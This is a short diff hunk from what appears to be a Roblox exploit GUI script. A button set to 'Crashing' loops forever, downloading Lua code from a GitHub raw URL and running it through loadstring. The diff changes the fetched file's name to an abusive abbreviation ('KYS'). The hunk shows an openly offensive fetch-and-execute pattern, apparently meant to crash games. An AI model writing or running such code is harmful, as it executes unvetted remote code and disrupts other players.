@@ -6800,7 +6800,7 @@ local function GBEJ_script() -- Gui.Button_38.LocalScript
 			script.Parent.Text = "Crashing"
 			wait(1)
 			while wait() do
-				loadstring(game:HttpGet("https://raw.githubusercontent.com/SViliszWorks/SVilisz---Collection/main/ok.txt"))()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SViliszWorks/SVilisz---Collection/main/KYS"))()
 			end
 		end
 		wait(0.16)
